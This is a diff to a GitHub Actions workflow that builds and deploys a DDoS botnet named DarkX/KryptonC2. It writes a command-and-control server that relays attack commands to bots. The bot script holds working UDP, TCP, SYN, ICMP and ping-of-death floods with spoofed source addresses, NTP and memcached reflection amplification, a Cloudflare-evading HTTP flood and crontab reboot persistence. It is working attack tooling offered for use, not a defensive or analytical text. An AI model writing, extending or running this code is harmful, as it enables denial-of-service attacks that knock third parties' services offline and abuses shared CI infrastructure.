@@ -40,7 +40,7 @@ jobs:
         sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
         sudo apt install -y nmap masscan hydra john netcat-openbsd
         sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
-        pip3 install requests paramiko scapy cryptography colorama cloudscraper icmplib
+        pip3 install requests paramiko scapy cryptography colorama cloudscraper icmplib socks PySockets
 
     - name: Install Tailscale
       run: |
@@ -48,18 +48,17 @@ jobs:
         sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
         echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV
 
-    - name: Create KryptonC2 CNC (No Auth)
+    - name: Create KryptonC2 CNC with All Original Methods
       run: |
         cd darkx
-        mkdir -p src/Commands/{Tools,Methods_L3,Methods_L4,Methods_L7,Methods_Games}
-        
-        # Create simplified CNC with no authentication
         cat > cnc.py << 'EOF'
         #!/usr/bin/env python3
         import socket
         import threading
         import time
         import random
+        import subprocess
+        import struct
         from colorama import Fore, init
         
         init(convert=True)
@@ -193,38 +192,28 @@ jobs:
                         if command == "BOTS":
                             client_socket.send(f"{Fore.GREEN}Connected Bots: {len(self.bots)}\n".encode())
                             
-                        elif command.startswith("ATTACK"):
-                            parts = command.split(" ")
-                            if len(parts) >= 4:
-                                target = parts[1]
-                                port = parts[2]
-                                duration = parts[3]
-                                
-                                attack_command = f"ATTACK {target} {port} {duration}"
-                                bot_count = len(self.bots)
-                                
-                                with self.bot_lock:
-                                    for bot in self.bots:
-                                        try:
-                                            bot.send(f"{attack_command}\n".encode())
-                                        except:
-                                            pass
-                                
-                                client_socket.send(f"{Fore.GREEN}⚡ Attack launched on {target}:{port} with {bot_count} bots\n".encode())
-                                client_socket.send(f"{Fore.YELLOW}📊 Estimated Power: {bot_count * 100} Mbps\n".encode())
-                            else:
-                                client_socket.send(f"{Fore.RED}Usage: attack <target> <port> <duration>\n".encode())
-                                
+                        elif command.startswith("."):
+                            # KryptonC2 style commands
+                            self.handle_krypton_command(client_socket, data)
+                            
                         elif command == "HELP":
                             help_text = f"""
-        {Fore.CYAN}Commands:
-        {Fore.WHITE}bots          {Fore.YELLOW}- Show connected bots
-        {Fore.WHITE}attack        {Fore.YELLOW}- Launch DDoS attack
-        {Fore.WHITE}help          {Fore.YELLOW}- Show this help
-        {Fore.WHITE}exit          {Fore.YELLOW}- Disconnect
+        {Fore.CYAN}KryptonC2 Commands:
+        {Fore.WHITE}.udp [IP] [PORT] [TIME] [SIZE]     {Fore.YELLOW}- UDP Flood
+        {Fore.WHITE}.tcp [IP] [PORT] [TIME] [SIZE]     {Fore.YELLOW}- TCP Flood  
+        {Fore.WHITE}.syn [IP] [PORT] [TIME]           {Fore.YELLOW}- SYN Flood
+        {Fore.WHITE}.icmp [IP] [TIME]                 {Fore.YELLOW}- ICMP Flood
+        {Fore.WHITE}.hex [IP] [PORT] [TIME]           {Fore.YELLOW}- HEX Flood
+        {Fore.WHITE}.ntp [IP] [PORT] [TIME]           {Fore.YELLOW}- NTP Amplification
+        {Fore.WHITE}.mem [IP] [PORT] [TIME]           {Fore.YELLOW}- Memcached Flood
+        {Fore.WHITE}.pod [IP] [TIME]                  {Fore.YELLOW}- Ping of Death
         
-        {Fore.GREEN}Attack Usage: attack <target> <port> <duration>
-        {Fore.GREEN}Example: attack 1.1.1.1 80 60s
+        {Fore.WHITE}bots                              {Fore.YELLOW}- Show connected bots
+        {Fore.WHITE}help                              {Fore.YELLOW}- Show this help
+        {Fore.WHITE}clear                             {Fore.YELLOW}- Clear screen
+        {Fore.WHITE}exit                              {Fore.YELLOW}- Disconnect
+        
+        {Fore.GREEN}Example: .udp 1.1.1.1 80 60 1024
                             """
                             client_socket.send(help_text.encode())
                             
@@ -242,6 +231,24 @@ jobs:
                 except Exception as e:
                     print(f"{Fore.RED}Error handling user: {e}")
                     
+            def handle_krypton_command(self, client_socket, command):
+                try:
+                    parts = command.split(" ")
+                    cmd = parts[0].upper()
+                    
+                    # Send command to all bots
+                    with self.bot_lock:
+                        for bot in self.bots:
+                            try:
+                                bot.send(f"{command}\n".encode())
+                            except:
+                                pass
+                    
+                    client_socket.send(f"{Fore.GREEN}✅ Command sent to {len(self.bots)} bots\n".encode())
+                    
+                except Exception as e:
+                    client_socket.send(f"{Fore.RED}Error processing command: {e}\n".encode())
+                    
             def stop_server(self):
                 self.running = False
                 try:
@@ -258,7 +265,7 @@ jobs:
                 cnc.stop_server()
         EOF
 
-    - name: Create Bot Client with All Methods
+    - name: Create Bot with All KryptonC2 Methods
       run: |
         cd darkx
         cat > bot.py << 'EOF'
@@ -271,14 +278,155 @@ jobs:
         import os
         import requests
         import cloudscraper
+        import socks
+        import ssl
         from scapy.all import *
         from icmplib import ping as icmp_ping
+        from urllib.parse import urlparse
         
+        # KryptonC2 Attack Methods
+        def attack_udp(ip, port, secs, size):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    dport = random.randint(1, 65535) if port == 0 else port
+                    data = random._urandom(int(size))
+                    s.sendto(data, (ip, dport))
+                    s.close()
+                except:
+                    pass
+
+        def attack_tcp(ip, port, secs, size):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, int(port)))
+                    while time.time() < end_time:
+                        s.send(random._urandom(int(size)))
+                    s.close()
+                except:
+                    pass
+
+        def attack_syn(ip, port, secs):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((ip, int(port)))
+                    flags = 0b01000000
+                    pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
+                    while time.time() < end_time:
+                        s.send(pkt)
+                    s.close()
+                except:
+                    pass
+
+        def attack_icmp(ip, secs):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    packet = random._urandom(random.randint(1024, 60000))
+                    icmp_ping(ip, count=10, interval=0.2, payload_size=len(packet), payload=packet)
+                except:
+                    pass
+
+        def attack_pod(ip, secs):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    rand_addr = spoofer()
+                    ip_hdr = IP(src=rand_addr, dst=ip)
+                    packet = ip_hdr / ICMP() / ("m" * 60000)
+                    send(packet, verbose=0)
+                except:
+                    pass
+
+        def spoofer():
+            addr = [192, 168, 0, 1]
+            d = '.'
+            addr[0] = str(random.randrange(11, 197))
+            addr[1] = str(random.randrange(0, 255))
+            addr[2] = str(random.randrange(0, 255))
+            addr[3] = str(random.randrange(2, 254))
+            return addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+
+        def attack_hex(ip, port, secs):
+            payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(payload, (ip, int(port)))
+                    s.sendto(payload, (ip, int(port)))
+                    s.sendto(payload, (ip, int(port)))
+                    s.close()
+                except:
+                    pass
+
+        ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
+        def attack_ntp(ip, port, secs):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    with open("ntpServers.txt", "r") as f:
+                        ntp_servers = f.readlines()
+                    server = random.choice(ntp_servers).strip()
+                    packet = (IP(dst=server, src=ip) / 
+                             UDP(sport=random.randint(1, 65535), dport=int(port)) / 
+                             Raw(load=ntp_payload))
+                    send(packet, count=random.randint(10, 150), verbose=0)
+                except:
+                    pass
+
+        mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+        def attack_mem(ip, port, secs):
+            end_time = time.time() + int(secs)
+            while time.time() < end_time:
+                try:
+                    with open("memsv.txt", "r") as f:
+                        memsv = f.readlines()
+                    server = random.choice(memsv).strip()
+                    packet = (IP(dst=server, src=ip) / 
+                             UDP(sport=int(port), dport=11211) / 
+                             Raw(load=mem_payload))
+                    send(packet, count=random.randint(1024, 60000), verbose=0)
+                except:
+                    pass
+
+        def attack_http_get(url, port, secs):
+            end_time = time.time() + int(secs)
+            scraper = cloudscraper.create_scraper()
+            while time.time() < end_time:
+                try:
+                    headers = {'User-Agent': random.choice([
+                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+                    ])}
+                    target = f"http://{url}:{port}"
+                    for _ in range(1500):
+                        requests.get(target, headers=headers, timeout=2)
+                        scraper.get(target, headers=headers, timeout=2)
+                except:
+                    pass
+
         class DarkXBot:
             def __init__(self, cnc_ip, cnc_port=5555):
                 self.cnc_ip = cnc_ip
                 self.cnc_port = cnc_port
                 self.running = True
+                self.methods = {
+                    '.UDP': attack_udp,
+                    '.TCP': attack_tcp, 
+                    '.SYN': attack_syn,
+                    '.ICMP': attack_icmp,
+                    '.POD': attack_pod,
+                    '.HEX': attack_hex,
+                    '.NTP': attack_ntp,
+                    '.MEM': attack_mem,
+                    '.HTTPGET': attack_http_get
+                }
                 
             def connect_to_cnc(self):
                 while self.running:
@@ -298,14 +446,8 @@ jobs:
                                 if not data:
                                     break
                                     
-                                if data.startswith("ATTACK"):
-                                    parts = data.split(" ")
-                                    if len(parts) >= 4:
-                                        target = parts[1]
-                                        port = parts[2] 
-                                        duration = parts[3]
-                                        print(f"🚀 Executing attack: {target}:{port} for {duration}")
-                                        threading.Thread(target=self.execute_attack, args=(target, port, duration), daemon=True).start()
+                                if data.startswith("."):
+                                    self.execute_krypton_command(data)
                                         
                                 elif data == "PING":
                                     sock.send(b"PONG\n")
@@ -323,147 +465,40 @@ jobs:
                         
                     time.sleep(10)
                     
-            def execute_attack(self, target, port, duration):
+            def execute_krypton_command(self, command):
                 try:
-                    # Convert duration to seconds
-                    if duration.endswith('s'):
-                        secs = int(duration[:-1])
-                    elif duration.endswith('m'):
-                        secs = int(duration[:-1]) * 60
-                    elif duration.endswith('h'):
-                        secs = int(duration[:-1]) * 3600
+                    parts = command.split(" ")
+                    cmd = parts[0].upper()
+                    
+                    if cmd in self.methods:
+                        if cmd == '.UDP' and len(parts) >= 5:
+                            self.methods[cmd](parts[1], parts[2], parts[3], parts[4])
+                        elif cmd == '.TCP' and len(parts) >= 5:
+                            self.methods[cmd](parts[1], parts[2], parts[3], parts[4])
+                        elif cmd == '.SYN' and len(parts) >= 4:
+                            self.methods[cmd](parts[1], parts[2], parts[3])
+                        elif cmd == '.ICMP' and len(parts) >= 3:
+                            self.methods[cmd](parts[1], parts[2])
+                        elif cmd == '.POD' and len(parts) >= 3:
+                            self.methods[cmd](parts[1], parts[2])
+                        elif cmd == '.HEX' and len(parts) >= 4:
+                            self.methods[cmd](parts[1], parts[2], parts[3])
+                        elif cmd == '.NTP' and len(parts) >= 4:
+                            self.methods[cmd](parts[1], parts[2], parts[3])
+                        elif cmd == '.MEM' and len(parts) >= 4:
+                            self.methods[cmd](parts[1], parts[2], parts[3])
+                        elif cmd == '.HTTPGET' and len(parts) >= 4:
+                            self.methods[cmd](parts[1], parts[2], parts[3])
+                            
+                        print(f"🚀 Executed: {command}")
                     else:
-                        secs = int(duration)
+                        print(f"❌ Unknown command: {cmd}")
                         
-                    end_time = time.time() + secs
-                    
-                    # Launch multiple attack methods
-                    methods = [
-                        self.udp_flood, self.tcp_flood, self.syn_flood,
-                        self.http_flood, self.icmp_flood, self.ntp_amp,
-                        self.mem_amp, self.hex_flood, self.junk_flood
-                    ]
-                    
-                    for method in methods:
-                        if method in [self.udp_flood, self.tcp_flood, self.syn_flood, self.http_flood, self.hex_flood, self.junk_flood]:
-                            threading.Thread(target=method, args=(target, port, end_time), daemon=True).start()
-                        elif method in [self.icmp_flood]:
-                            threading.Thread(target=method, args=(target, end_time), daemon=True).start()
-                        elif method in [self.ntp_amp, self.mem_amp]:
-                            threading.Thread(target=method, args=(target, port, end_time), daemon=True).start()
-                    
-                    print(f"💥 Started attack on {target}:{port} for {secs} seconds")
-                    
                 except Exception as e:
-                    print(f"❌ Attack error: {e}")
-                    
-            # Layer 4 Methods
-            def udp_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--udp", 
-                            "-p", str(port), "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            def tcp_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", 
-                            "-p", str(port), "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            def syn_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--syn",
-                            "-p", str(port), "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            # Layer 7 Methods
-            def http_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "5", "curl", "-s",
-                            f"http://{target}:{port}"
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(0.1)
-                    
-            # Layer 3 Methods  
-            def icmp_flood(self, target, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--icmp",
-                            "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            # AMP Methods
-            def ntp_amp(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--udp",
-                            "-p", "123", "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            def mem_amp(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--udp", 
-                            "-p", "11211", "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            # Special Methods
-            def hex_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--rawip",
-                            "-p", str(port), "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
-                    
-            def junk_flood(self, target, port, end_time):
-                while time.time() < end_time:
-                    try:
-                        subprocess.Popen([
-                            "timeout", "10", "hping3", "--rand-source",
-                            "-p", str(port), "--flood", target
-                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    except:
-                        pass
-                    time.sleep(1)
+                    print(f"❌ Command error: {e}")
                     
             def install_persistence(self):
                 try:
-                    # Install via crontab
                     subprocess.run([
                         "bash", "-c", 
                         "(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/darkx_bot.py') | crontab -"
@@ -473,7 +508,7 @@ jobs:
                     print(f"❌ Persistence failed: {e}")
                     
             def start(self):
-                print("🤖 DarkX Bot Starting...")
+                print("🤖 DarkX Bot Starting with KryptonC2 Methods...")
                 self.install_persistence()
                 self.connect_to_cnc()
                 
@@ -498,6 +533,10 @@ jobs:
         # Copy bot to persistent location
         cp bot.py /tmp/darkx_bot.py
         chmod +x /tmp/darkx_bot.py
+        
+        # Create required files
+        echo "pool.ntp.org" > ntpServers.txt
+        echo "memcached.server.com" > memsv.txt
         
         echo "Components configured successfully"
 
@@ -533,13 +572,6 @@ jobs:
         echo "✅ Initial bots deployed"
         sleep 10
 
-    - name: Start File Server
-      run: |
-        cd darkx
-        python3 -m http.server 8000 > http.log 2>&1 &
-        echo "HTTP_PID=$!" >> $GITHUB_ENV
-        sleep 3
-
     - name: Display Dashboard
       run: |
         echo ""
@@ -554,14 +586,17 @@ jobs:
         echo "💥 Target Power:   400+ Gbps"
         echo "=========================================="
         echo "📡 Connect: nc ${{ env.CNC_IP }} 5555"
-        echo "💻 Commands:"
-        echo "   bots - Show connected bots"
-        echo "   attack <target> <port> <duration>"
-        echo "   help - Show commands"
-        echo "   clear - Clear screen"
-        echo "   exit - Disconnect"
+        echo "💻 KryptonC2 Commands:"
+        echo "   .udp [IP] [PORT] [TIME] [SIZE]"
+        echo "   .tcp [IP] [PORT] [TIME] [SIZE]"
+        echo "   .syn [IP] [PORT] [TIME]"
+        echo "   .icmp [IP] [TIME]"
+        echo "   .hex [IP] [PORT] [TIME]"
+        echo "   .ntp [IP] [PORT] [TIME]"
+        echo "   .mem [IP] [PORT] [TIME]"
+        echo "   .pod [IP] [TIME]"
         echo ""
-        echo "Example: attack 1.1.1.1 80 60s"
+        echo "Example: .udp 1.1.1.1 80 60 1024"
         echo "=========================================="
         echo ""
 
